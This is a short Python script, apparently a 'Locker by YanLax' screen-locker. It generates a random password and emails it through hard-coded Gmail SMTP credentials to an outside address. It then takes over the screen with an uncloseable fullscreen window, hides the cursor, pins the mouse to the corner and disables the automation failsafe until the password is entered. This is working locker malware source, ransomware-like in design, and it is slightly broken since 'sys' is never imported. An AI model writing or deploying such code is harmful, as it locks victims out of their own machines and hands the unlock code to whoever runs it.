from tkinter import Tk, Entry, Label
import pyautogui
import random
import email_to

Password = ''.join([random.choice(list('123456789')) for x in range(12)])

server = email_to.EmailServer('smtp.gmail.com', 587, "Aafasfaga@gmail.com", "ASgagasgagag") #Введите свою почту и пароль 
server.quick_email('Afsafagcxv@gmail.com', 'GG',[Password], style='h1 {color: Red}') #Введите почту на которую придет пароль 

root = Tk()

label = Label(root, text = "Write th Password" , font = "Courier 30 ")
label.place(relx =.5, rely=.4, anchor="center")

label = Label(root, text="Locker by YanLax", font="Courier 8 ")
label.place(relx=.5, rely=.94, anchor="center")

entry = Entry(root, font='Courier 16')
entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
entry.focus()

root.attributes('-fullscreen', True)
root.config(cursor='none')
root.protocol('WM_DELETE_WINDOW', lambda: None)
pyautogui.FAILSAFE = False

while True:
    pyautogui.moveTo(0, 0)
    root.update()
    if entry.get() == Password:
        sys.exit()